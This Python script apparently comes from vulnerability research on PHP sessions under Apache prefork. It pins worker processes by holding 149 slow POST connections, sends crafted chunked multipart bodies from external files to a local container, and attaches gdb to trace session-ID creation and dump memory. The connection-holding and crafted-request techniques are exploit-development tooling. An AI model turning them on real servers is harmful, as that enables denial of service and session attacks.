#!/usr/bin/env python3
"""Pin one prefork child, run A1 then B1 with gdb breakpoints on
php_session_create_id / php_session_send_cookie, and print PS(id) sources."""
import socket
import subprocess
import sys
import time

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 18701
CONT = sys.argv[2] if len(sys.argv) > 2 else "m109-8426"
A1 = sys.argv[3] if len(sys.argv) > 3 else "/tmp/opencode/research/modphp_109619_20261023T010232Z/work/a1_8426.bin"
B1 = sys.argv[4] if len(sys.argv) > 4 else "/tmp/opencode/research/modphp_109619_20261023T010232Z/work/b1_8426.bin"
HOLD = int(sys.argv[5]) if len(sys.argv) > 5 else 149
IDOFF = int(sys.argv[6], 0) if len(sys.argv) > 6 else 0x10

GDB = f"""
set pagination off
set confirm off
set breakpoint pending on
break php_session_create_id
commands
  silent
  printf "=== CREATE_ID\\n"
  bt 6
  continue
end
break php_session_reset_id
commands
  silent
  printf "=== RESET_ID\\n"
  bt 12
  printf "PSID=%p\\n", *(void**)((char*)&ps_globals+{IDOFF})
  set $id=*(void**)((char*)&ps_globals+{IDOFF})
  if $id
    printf "IDLEN=%lu\\n", *(unsigned long*)($id+0x10)
    x/8gx $id
  end
  continue
end
continue
"""


def sh(cmd):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True).stdout


def send_chunked(port, path, body_file, timeout=240):
    with open(body_file, "rb") as fh:
        body = fh.read()
    hdr = ("POST %s HTTP/1.1\r\nHost: x:%d\r\n"
           "Content-Type: multipart/form-data; boundary=%s\r\n"
           "Transfer-Encoding: chunked\r\nConnection: close\r\n\r\n" %
           (path, port, "C" * 10)).encode()
    s = socket.create_connection(("127.0.0.1", port), timeout=timeout)
    s.settimeout(timeout)
    resp = bytearray()
    try:
        s.sendall(hdr)
        for i in range(0, len(body), 65536):
            piece = body[i:i + 65536]
            s.sendall(("%x\r\n" % len(piece)).encode() + piece + b"\r\n")
        s.sendall(b"0\r\n\r\n")
        while len(resp) < 1 << 20:
            c = s.recv(65536)
            if not c:
                break
            resp.extend(c)
    except OSError:
        pass
    s.close()
    return bytes(resp)


def main():
    holders = []
    for i in range(HOLD):
        s = socket.create_connection(("127.0.0.1", PORT), timeout=10)
        s.sendall(b"POST /index.php HTTP/1.0\r\nHost: x\r\nContent-Length: 1000000\r\n\r\nX")
        holders.append(s)
    n = 0
    for _ in range(40):
        time.sleep(0.5)
        n = int(sh(f"docker exec {CONT} sh -c 'pgrep -c apache2'").strip() or 0)
        if n >= HOLD + 1:
            break
    print("holders", HOLD, "children", n)

    r = send_chunked(PORT, "/index.php?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v", A1)
    print("A1", r.split(b"\r\n")[0])
    time.sleep(0.4)
    line = sh(f"docker exec {CONT} sh -c 'tail -1 /var/log/apache2/p2s-access.log'").strip()
    pid = line.split()[0]
    print("A1 child", pid, line)

    with open("/tmp/instr.gdb", "w") as fh:
        fh.write(GDB)
    sh(f"cat /tmp/instr.gdb | docker exec -i {CONT} sh -c 'cat > /tmp/instr.gdb'")
    subprocess.Popen(f"docker exec {CONT} gdb -q -p {pid} -batch -x /tmp/instr.gdb > /tmp/gdb_instr.log 2>&1",
                     shell=True)
    time.sleep(1.5)

    r = send_chunked(PORT, "/index.php", B1, 300)
    print("B1", r.split(b"\r\n")[0], "resp", len(r))
    try:
        i = r.find(b"Set-Cookie: PHPSESSID=")
        if i >= 0:
            v = r[i + len(b"Set-Cookie: PHPSESSID="):].split(b"\r\n")[0]
            print("cookie len", len(v), "head", v[:24])
    except Exception as e:
        print("cookie parse", e)
    time.sleep(1.5)
    for s in holders:
        try:
            s.close()
        except OSError:
            pass
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
